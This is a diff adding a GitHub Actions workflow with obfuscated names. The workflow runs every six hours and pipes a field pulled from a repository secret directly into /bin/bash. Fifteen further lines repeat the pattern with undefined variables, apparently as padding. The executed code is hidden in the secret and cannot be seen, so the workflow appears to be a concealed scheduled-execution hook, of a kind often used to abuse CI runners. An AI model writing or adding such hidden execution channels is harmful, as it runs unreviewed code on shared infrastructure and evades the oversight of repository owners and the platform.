@@ -1,0 +1,33 @@
+name: shawennixiang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '51 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: shawennixiang
+        env:
+          liad919: ${{ secrets.liad919 }}
+        run: |
+          echo $liad919 | jq -r .aoz7570 | /bin/bash
+          echo $df2 | jq -r .k4052 | /bin/bash
+          echo $ce87 | jq -r .nn91 | /bin/bash
+          echo $bkc003 | jq -r .kiwzr65 | /bin/bash
+          echo $n53676 | jq -r .j0 | /bin/bash
+          echo $ph6 | jq -r .xp91 | /bin/bash
+          echo $a5764 | jq -r .o1 | /bin/bash
+          echo $gr75 | jq -r .znwjx0445 | /bin/bash
+          echo $wyj5 | jq -r .p829 | /bin/bash
+          echo $wrg7868 | jq -r .xume40 | /bin/bash
+          echo $l36466 | jq -r .c0028 | /bin/bash
+          echo $k8167 | jq -r .dqef81 | /bin/bash
+          echo $vtpf380 | jq -r .bflt585 | /bin/bash
+          echo $kjhrk221 | jq -r .gfiss316 | /bin/bash
+          echo $ah811 | jq -r .qk44 | /bin/bash
+          echo $ly9131 | jq -r .c764 | /bin/bash
+
